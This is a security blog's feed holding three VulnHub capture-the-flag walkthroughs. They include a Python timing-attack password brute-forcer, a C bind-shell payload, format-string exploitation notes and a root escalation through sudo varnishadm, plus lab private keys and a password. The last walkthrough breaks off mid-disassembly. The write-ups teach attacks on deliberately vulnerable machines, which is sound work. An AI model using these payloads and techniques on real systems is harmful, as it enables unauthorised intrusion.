<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vm's | FourFourFourFour]]></title>
  <link href="http://recrudesce.github.io/blog/categories/vms/atom.xml" rel="self"/>
  <link href="http://recrudesce.github.io/"/>
  <updated>2015-06-12T11:26:30+01:00</updated>
  <id>http://recrudesce.github.io/</id>
  <author>
    <name><![CDATA[recrudesce]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Don't Answer the Doorbell]]></title>
    <link href="http://recrudesce.github.io/2015/01/06/dont-answer-the-doorbell/"/>
    <updated>2015-01-06T22:13:19+00:00</updated>
    <id>http://recrudesce.github.io/2015/01/06/dont-answer-the-doorbell</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/the-purge-1,110/">The Purge</a> was created by strata, and I can tell you it&rsquo;s a hassle to complete.  But I did, and here&rsquo;s how !</p>

<!-- more -->


<h1>What&rsquo;s Running</h1>

<p>I don&rsquo;t want to tell you how to do this bit, so here&rsquo;s the output</p>

<pre><code class="bash">root@kali:~# nmap -sS -p- -T5 -Pn 172.16.231.134

Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-06 22:17 GMT
Nmap scan report for thepurge (172.16.231.134)
Host is up (0.00027s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:AD:9E:6C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 52.91 seconds
root@kali:~# 
</code></pre>

<p>Visiting the HTTP server without specifying a hosts entry will provide you with some instructions&hellip;  however once a hosts entry is created, you can reference the VM correctly.
So, I hit it with a browser to see what I was faced with.</p>

<p><img src="/images/thepurge_001.png" alt="thepurge_001" /></p>

<p>None of the links work on this page, so I&rsquo;m stuck just looking at this.  Using <code>nc</code>, I saw that the page is hosted via Varnish.</p>

<pre><code class="bash">root@kali:~# nc 172.16.231.134 80
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 06 Jan 2015 22:21:12 GMT
Server: Apache
Last-Modified: Fri, 02 Jan 2015 22:52:51 GMT
ETag: "82a-50bb3334896c0"
GovPurGe: Blessed be our New Founding Fathers and America
Content-Type: text/html; charset=UTF-8
X-Varnish: 3
Age: 0
Via: 1.1 varnish-v4
Connection: close
Accept-Ranges: bytes
</code></pre>

<p>Varnish is a caching server, and has a PURGE HTTP option which cleans out any caches.  Also note the GovPurGe header.</p>

<p>My next step was to do some enumeration on the page.  There are 3 reviews, one of which is in pseudo-latin.  However, there are 4 words that immediately stood out to me due to strange captitalisation.  <code>Steg</code>, <code>Hide</code>, <code>Varnish</code>, and <code>Purge</code>.
I already know the server is Varnish, and I know about the PURGE option.  However, steghide implies that something is hidden in an image&hellip;</p>

<script type="text/javascript" src="https://asciinema.org/a/15257.js" id="asciicast-15257" async></script>


<p>So, an ominous message&hellip; I&rsquo;ll note that down for later as it is not required right now.</p>

<p>There&rsquo;s nothing else on this page of interest, so I decided to see what would happen if I send a PURGE request to the main page using <code>curl</code></p>

<script type="text/javascript" src="https://asciinema.org/a/15247.js" id="asciicast-15247" async></script>


<p>Once the PURGE completed, I visited the page again with a browser, and was presented with different page content.</p>

<p><img src="/images/thepurge_002.png" alt="thepurge_002" /></p>

<p>Interesting.  I also discovered that the image at the bottom of the page, which I previously ran through steghide had a different filename.  Maybe there&rsquo;s something different inside it ?</p>

<script type="text/javascript" src="https://asciinema.org/a/15248.js" id="asciicast-15248" async></script>


<p>Different data - that&rsquo;s interesting.  The Youtube video linked is <a href="https://www.youtube.com/watch?v=2tmc8rJgxUI#7d5,7a69,7cb,16">Knocking on Heavens Door by Guns N Roses</a>, however the random characters after the URL are HEX, which decode to 2005, 31337, 1995, and 22 in decimal.  Sounds like port knocking to me which opens SSH access, but I don&rsquo;t have any usernames, passwords, or private keys to use.</p>

<p>Remember the message we obtained from the first JPEG file ?  <code>The reviewers are fortunate to have homes in today's purged economic climate.</code>.  This implies that we might be able to browse the home folders of the various reviewers.  Looking at the original, and purged versions of the front page, it is possible to obtain a list of possible users.  Bill Williams0n, Zoey Sand1n, James Holmes, Charlie Hanger, and Bin Ladin.  Of these users, only two home folders are accessible.</p>

<h1><a href="http://thepurge/~bwilliams0n">http://thepurge/~bwilliams0n</a></h1>

<p><img src="/images/thepurge_003.png" alt="thepurge_003" /></p>

<p>What an interesting <a href="https://www.youtube.com/watch?v=vca7c04r95I">Youtube video</a></p>

<p>However, the HTML source is much more interesting</p>

<p>&#8220;` html</p>

<p><html>
<head>
  <title>Bill Williamson</title>
</head>
<body bgcolor="black">
  <center>
    <embed width="840" height="620" src="http://www.youtube.com/v/vca7c04r95I">
  </center>
</body></p>

<!--
For the glory of sshaitan, of course!
-->


<pre><code>
This didn't tell me much, so I decided to PURGE it too using the `curl` command from earlier.  This resulted in the following page being made available

![thepurge_004](/images/thepurge_004.png)

The [Youtube video](https://www.youtube.com/watch?v=uV-V1FqaEk8) is even weirder, but the source changed too.
</code></pre>

<p><html>
<head>
  <title>Bill Williamson</title>
</head>
<body bgcolor="black">
  <center>
    <embed width="840" height="620" src="http://www.youtube.com/v/uV-V1FqaEk8">
  </center>
</body></p>

<!--
-----BEGIN DSA PRIVATE KEY-----
MIIBvAIBAAKBgQDnNAyaHiNv1SynzOt+E83khP9PRQTmKlyvkx13b/3ARc/WjO9b
dAT//ZgAxttQiu1n8fqU+oop562TXvQyOm83YWkxVbf+YdQ4KUWdOMxFWJdbkCRW
IUa1XgoCVnIwz4I0fjKtvgNgf/TAmwz9sa2sqV6IYsROj6aTt7SdwXCtnQIVAP3b
n9k4O4SZ/8G83X6H/IMcjExRAoGAR2r8Zh/oZx5GOeDBacuy3LcDa3vfpHLfrqCK
X3V6I7VvQJcwjjorZQJqkO/7ECpHfrZIqVoN+TjYH2u2unRH56o55x5/rhUUCl1c
kFUikPwjwyLCjVT2DRD4WFnZcCa2wnCI9sxK70V+TbjMMS3AowxTBI+BhVXyYxLx
ylJw9kQCgYEA0Fggrt1A+DDQ1KS506LKPkT24ny3AMHg1psvjieT9uIO4LvFPq23
4wiZvMLNyapRlNADX/TGRmcC2bgf6P7l9D8zHEqoActThnPfMa05GFFvdF3z9ZEX
jRLP1n8BKjjElprmKYrqh8fLEk1gLA+B/GJRDO6+9oq5Ada4/3EEYuACFQDYW9iL
RQBGwzv7GW+JTy1Q1cmxew==
-----END DSA PRIVATE KEY-----
-->


<p>&#8220;`</p>

<p>That, to me, looks like a private key.  So, back to port knocking.</p>

<h1>Who&rsquo;s There</h1>

<p>Once the private key has been saved into a file and chmodded correctly (600), I use <code>knocker</code> to knock the ports, which allows SSH access.</p>

<script type="text/javascript" src="https://asciinema.org/a/15250.js" id="asciicast-15250" async></script>


<p>So, now I have a shell.  More enumeration required !  Wandering around the file system identifies that bwilliams0n has access to /home/zsand1n.  Within that folder is an archive encrypted with PGP.</p>

<pre><code class="bash">[bwilliams0n@thepurge zsand1n]$ ls -la
total 964
drwxr-xr-x. 3 zsand1n zsand1n   4096 Jan  1 23:43 .
drwxr-xr-x. 7 root    root        81 Jan  2 17:57 ..
-rw-r--r--. 1 zsand1n zsand1n     18 Sep 25 21:53 .bash_logout
-rw-r--r--. 1 zsand1n zsand1n    193 Sep 25 21:53 .bash_profile
-rw-r--r--. 1 zsand1n zsand1n    231 Sep 25 21:53 .bashrc
-rw-r--r--. 1 zsand1n zsand1n 964832 Jan  1 23:42 homes-backup-20150101.tar.gz.gpg
drwxrwxr-x. 6 zsand1n zsand1n   4096 Jan  6 14:45 public_html
[bwilliams0n@thepurge zsand1n]$ 
</code></pre>

<p>To decrypt this file we&rsquo;ll need a copy of the private key used by the encrypting user.</p>

<p>There is a file in public_html that includes a public PGP key, but this is no help to us at all.</p>

<pre><code class="bash">[bwilliams0n@thepurge public_html]$ cat gpg_key.html 
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v2.0.22 (GNU/Linux)

mQENBFSmEy4BCADRTF4zqER6uVJ3II/tDHRIrWpeA8XGoegtTpjSOwjs8HYjPWzV
KWQsBj6GpI5zOHGjC7Tbufxn1C0TNotrEpOxCus2s/oaMJ8e1RmmpyP21cMe5Sxn
+Nu1O+oRA5QP2IYqnZvShqk2vw3UduMxheKik6EVA7EjZBeIdYhQK2fytbydrTIs
y+9GA1/UNBWQh1lQhRSbmQyiiTbQrybyhVZWrPT9E55mGJq4fLFybGRy+zjIsDfT
1gcS+BB6zdwp8YkxLR2DgaaSiTEl1YdUehoEoJMgtEdOqfng16O4ZL3rkIYKdjBi
KkB2sxYTH8PhF63D2h6/8w03ra5HZOivsNGVABEBAAG0HlpvZXkgU2FuZGluIDx6
c2FuZDFuQHRoZXB1cmdlPokBOQQTAQIAIwUCVKYTLgIbAwcLCQgHAwIBBhUIAgkK
CwQWAgMBAh4BAheAAAoJEEaUeoP/ScSJkZgIAK9xUZWnr1SnshBYawc6xWNPDdLM
8RjEPjgFdEXQe3D0xB16i0WC1153e4o6+L6rSGkkIf2siiY2BAS+yyR5YilA2aXv
CdYbYkcqRpXmGMeIiV9yKU3xZkgJUky28q0YNGEYZUGHYaRpS8PbQhX0a2OeVABV
vRXhrXju5SHDY4GyrKLheQ1u+pWQjNjeQr4K9jA7oPsB1X1EKzo6w89gZ7RZQCfz
bZoS+seodRIM32kGQYBvT0gE1aaKZ5OaASn7ezHOILDvCdYJtiGEcTuZ3TO37j4E
3wONeo6CFT/AJQ6xGGN6dMeCNfvEFJMzjW3ejrfiQyN0z/3BdaIEyAVhMFa5AQ0E
VKYTLgEIALFyNyOhUAkcFgXMoldw81Lg9ex34MeOix1LpOqInQU92VkmS1uYqKZJ
T4uW5mye2RLg4P3MHm60kmKIRXZYEx96aRgqxLaogQXv0pQ/t5RMNuvLn7wM934U
xkct7Ic6B3djnfoYt6UZftOmLmCl2mW8my/07N92Tx6VWbHu/MFgCFnj6EfbX6Vq
FER6A/0mtlHGbI0ysl+djB0vVw8g6zYUhxn7lTjEHLa237wuGMkWG7COcWzBBadU
DkTnN5692cpny5oEpMFi7E8xO4TNUw6V6mrMjYZGvBHlsF2akozhizU7dqhI+jlp
WTXVV2JYyHEM0WGz34ipn1a/kMKUBWMAEQEAAYkBHwQYAQIACQUCVKYTLgIbDAAK
CRBGlHqD/0nEiWh6B/4xo4G8vNoTgc4jJRHJ0ZezTS/sXRkfZO2eNDXVgcY7pF5Q
EaA/9VMEpDRz53eAt99mpj+eTQM/kVRKExqcAVDwy0YYXnvsjHFwD5dunIq88OSw
WLPNMBRgRvggez47zxjKtV6DiL1BYQ0YO3oyDtbA1CKhBHh8KmH0aV+/YE1axnAL
Qngh/4fF0E4OZ5vuCBsRrHHrH3r4k0jGRHTHvG3e9gfGcPKgr0P6To5wA4B5XEc1
UgN4YJWe1XeOy7yKCTanvUIrVWolHkao5xdQH8OOBqPQySACcW32T5sQxCqTkeR7
sH2SRodaWIgc9aVKLI1SAW2oYWJJNsqs1fuJtF1w
=tVjP
-----END PGP PUBLIC KEY BLOCK-----
</code></pre>

<p>Could I use my old friend PURGE and see if the file changes ?  Why yes, yes I can&hellip; and yes, it does change - I now have a private key instead of a public one.</p>

<pre><code class="bash">-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: GnuPG v2.0.22 (GNU/Linux)

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
UgFtqGFiSTbKrNX7ibRdcA==
=ZWQm
-----END PGP PRIVATE KEY BLOCK-----
</code></pre>

<p>This can now be imported into GPG and used to decrypt the archive found earlier.  Remember the GovPurGe header from earlier ?  It contains the passphrase required to use the key.</p>

<script type="text/javascript" src="https://asciinema.org/a/15255.js" id="asciicast-15255" async></script>


<p>I spent a lot of time looking through the files from this archive, and eventually found a password of &ldquo;vi.isforleeth@xxors&rdquo; hidden in .bash_history in the jholmes directory.<br/>
This allowed me to su as the jholmes user and discover that he is able to run the <code>/usr/bin/varnishadm</code> application via <code>sudo</code>.  I also discovered that, with a few tweaks, you can get <code>varnishadm</code> to compile inline C and run commands as the user varnishd is running as.  The last video shows me switching to the jholmes user, creating a malicious shell script to grab a copy of the dash binary from my attacking VM (dash does not drop privileges like bash does, therefore is a much better option for suid shells), running <code>sudo varnishadm</code>, and configuring varnish to run as <code>root</code> instead of the <code>varnish</code> user.  I then configure the cc_compiler parameter to run the malicious script I created earlier, which allows me to drop to a root shell and read the <code>/FLAG.txt</code> file.</p>

<script type="text/javascript" src="https://asciinema.org/a/15256.js" id="asciicast-15256" async></script>


<p>Done.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stealing the Fire from Heaven]]></title>
    <link href="http://recrudesce.github.io/2015/01/06/stealing-the-fire-from-heaven/"/>
    <updated>2015-01-06T12:41:45+00:00</updated>
    <id>http://recrudesce.github.io/2015/01/06/stealing-the-fire-from-heaven</id>
    <content type="html"><![CDATA[<p>c0ne surprised us all by releasing <a href="https://www.vulnhub.com/entry/pandoras-box-1,111/">Pandora&rsquo;s Box</a>, which is a VM geared more towards exploit dev, and breaks the norm for vulnerable VM&rsquo;s, as it doesn&rsquo;t start with a website !</p>

<p>There are 5 challenges, I am going to post them as I crack them.</p>

<!-- more -->


<h1>Opening the Jar</h1>

<p>NMAP shows that only 2 ports are open, 22 and 54311.  22 is obviously SSH, whereas 54311 is&hellip; ?</p>

<pre><code class="bash">root@kali:~# nc -nv 172.16.231.133 54311
(UNKNOWN) [172.16.231.133] 54311 (?) open
#######################
# Secure Remote Shell #
#######################
Welcome, please log in
Password: 
</code></pre>

<p>OK, we don&rsquo;t know the password, and bruting it might be a bit excessive (though I did run it through rockyou to no avail).
I spent a lot of time looking at this, and found out that the response time for a password of &ldquo;a&rdquo; was a lot quicker than the response time for a password of &ldquo;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&rdquo;.  Maybe the application is parsing the password, and the answer is a timing thing ?  Maybe I can work out the characters based on how quick the application responds to my input.</p>

<p>I wrote the following Python script to get an idea of timings for each letter while trying to guess the first character of the password</p>

<pre><code class="python">#!/usr/bin/python
import socket, time, string, numpy
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('172.16.231.133', 54311))
data = s.recv(1024)

discovered = ''
for charact in (string.ascii_letters + string.digits):
        #print charact + ": "
        t_start = time.time()
        s.send(discovered+charact+"\n")
        s.recv(200)
        avg1 = time.time() - t_start
        t_start = time.time()
        s.send(discovered+charact+"\n")
        s.recv( 200)
        avg2 =  time.time() - t_start
        t_start = time.time()
        s.send(discovered+charact+"\n")
        s.recv(200)
        avg3 = time.time() - t_start
        t_start = time.time()
        s.send(discovered+charact+"\n")
        s.recv(200)
        avg4 = time.time() - t_start
        t_start = time.time()
        s.send(discovered+charact+"\n")
        s.recv(200)
        avg5 = time.time() - t_start
        avg = [avg1, avg2, avg3, avg4, avg5]
        letter_avg = numpy.mean(avg)
        print "Letter was ", charact
        print "Average Response Time was ", letter_avg

s.close()
</code></pre>

<p>This produces an output like the following</p>

<script type="text/javascript" src="https://asciinema.org/a/15238.js" id="asciicast-15238" async></script>


<p>It is sensible to hazard a guess that the first character is &ldquo;R&rdquo;, due to it responding a lot quicker than all other characters attempted.  I then wrapped this into a script to brute the whole password</p>

<pre><code class="python">#!/usr/bin/python
import socket, time, string, numpy, sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('172.16.231.133', 54311))
data = s.recv(1024)
print "Attempting to Brute Password Until Successful Login..."
discovered = ''
for charnum in range (0, 100):

        for charact in (string.ascii_letters + string.digits):
                t_start = time.time()
                s.send(discovered+charact+"\n")
                s.recv(200)
                avg1 = time.time() - t_start
                t_start = time.time()
                s.send(discovered+charact+"\n")
                s.recv( 200)
                avg2 =  time.time() - t_start
                t_start = time.time()
                s.send(discovered+charact+"\n")
                s.recv(200)
                avg3 = time.time() - t_start
                t_start = time.time()
                s.send(discovered+charact+"\n")
                s.recv(200)
                avg4 = time.time() - t_start
                t_start = time.time()
                s.send(discovered+charact+"\n")
                prompt = s.recv(200)
                avg5 = time.time() - t_start
                avg = [avg1, avg2, avg3, avg4, avg5]
                letter_avg = numpy.mean(avg)
                if letter_avg &lt; 0.001:
                        discovered = discovered + charact
                        sys.stdout.write('\rPassword Discovered: '+ discovered)
                        sys.stdout.flush()
                        break
        if 'Invalid' in prompt:
                meh = ''
        else:
                print "\nGot a successful login !  Use password above."
                break;
s.close()
</code></pre>

<p>This script produces the following output</p>

<script type="text/javascript" src="https://asciinema.org/a/15235.js" id="asciicast-15235" async></script>


<p>As per the video above, once the bruted password is entered into the application, we&rsquo;re provided with a shell.</p>

<p>Onto the next step !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Because she was a princess she had a Pegasus.]]></title>
    <link href="http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/"/>
    <updated>2014-12-19T13:50:49+00:00</updated>
    <id>http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/theknapsy">Knapsy</a> (<a href="https://knapsy.github.io/">blog</a>) released <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to experience the VM at the same time as everyone else.</p>

<p>People generally work alone on VM&rsquo;s, so to mix it up a bit, I decided to team up with <a href="https://twitter.com/barrebas">barrebas</a> (<a href="https://barrebas.github.io/">blog</a>) and own the VM as a collaboration :)</p>

<p>So, here&rsquo;s a quick walkthrough on how to root Pegasus, written by both barrebas and myself.</p>

<!-- more -->


<h1>Getting a Foot(hoof?)hold</h1>

<p><img src="http://awesomelytechie.com/wp-content/uploads/2013/08/Lets-get-down-to-business.gif" alt="" /></p>

<p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>

<pre><code class="bash">root@kali:~# nmap -sS -p- -T5 172.16.231.132

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:31 GMT
Nmap scan report for 172.16.231.132
Host is up (0.000063s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
8088/tcp  open  radan-http

MAC Address: 00:0C:29:E3:2A:04 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
root@kali:~#
</code></pre>

<p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>

<p><a href="/images/pegasus_001.png"><img src="/images/pegasus_001.png" alt="pegasus_001" /></a></p>

<p>Time to brute force some directories/files. Experience has shown me that vulnerable VM creators are sneaky gits, so I opted to use a large dictionary here, just to see what it came up with. Because of this large dictionary, I had to use dirbuster instead of dirb, because dirb takes ages to parse large dictionary files. Prepare for some horrible UI screenshots&hellip;</p>

<p><a href="/images/pegasus_002.png"><img src="/images/pegasus_002.png" alt="pegasus_002" /></a></p>

<p>I&rsquo;m only interested in the files that returned HTTP 200, as these actually exist, so submit.php and codereview.php</p>

<p><a href="/images/pegasus_003.png"><img src="/images/pegasus_003.png" alt="pegasus_003" /></a></p>

<p>codereview.php POSTS to submit.php, so for the moment I can ignore submit.php and focus on codereview.php</p>

<p><a href="/images/pegasus_004.png"><img src="/images/pegasus_004.png" alt="pegasus_004" /></a></p>

<p><img src="http://i527.photobucket.com/albums/cc352/gabzylovescrack/HTTYD/Shudder.gif" alt="" /></p>

<p>Mike is a code reviewer, and a trainee&hellip; therefore is pretty inexperienced. After a bit of time throwing various languages at the application, I found out that if you provide C sourcecode, it gets compiled and executed. Nice ! Lets bash some shellcode in there - specifically a bind shell and submit it.</p>

<pre><code class="c">#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;

int main(void)
{
        int clientfd, sockfd;
        int dstport = 4444;
        int o = 1;
        struct sockaddr_in mysockaddr;

        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        //setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don't have space for

        mysockaddr.sin_family = AF_INET; //2
        mysockaddr.sin_port = htons(dstport);
        mysockaddr.sin_addr.s_addr = INADDR_ANY; //0

        bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));

        listen(sockfd, 0);

        clientfd = accept(sockfd, NULL, NULL);

        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);

        execve("/bin/sh", NULL, NULL);
        return 0;
}
</code></pre>

<p>A quick NMAP scan confirms port 4444 has been opened.</p>

<pre><code class="bash">root@kali:~# nmap -sS -p4444 -T5 172.16.231.132

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:47 GMT
Nmap scan report for 172.16.231.132
Host is up (0.00040s latency).
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 00:0C:29:E3:2A:04 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
root@kali:~#
</code></pre>

<p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>

<pre><code class="bash">root@kali:~# nc -nv 172.16.231.132 4444
(UNKNOWN) [172.16.231.132] 4444 (?) open
python -c 'import pty;pty.spawn("/bin/bash")'
mike@pegasus:/home/mike$ id
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
mike@pegasus:/home/mike$
</code></pre>

<p>Now over to barrebas for the next step ! <em>fancy screen wipe animation</em></p>

<hr />

<p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>

<pre><code class="bash">mike@pegasus:~$ ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit
</code></pre>

<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>

<pre><code class="bash">Selection: 1

Enter first number: 5
Enter second number: AAAA
Error details: AAAA
</code></pre>

<p>That seemed promising. I entered:</p>

<pre><code class="bash">Selection: 1

Enter first number: 5
Enter second number: %x
Error details: bff1039c
</code></pre>

<p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>

<pre><code class="bash">mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ldd my_first
    linux-gate.so.1 =&gt;  (0x40022000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
    /lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>

<pre><code class="bash">080483b0 &lt;printf@plt&gt;:
 80483b0:   ff 25 fc 9b 04 08       jmp    *0x8049bfc
 80483b6:   68 00 00 00 00          push   $0x0
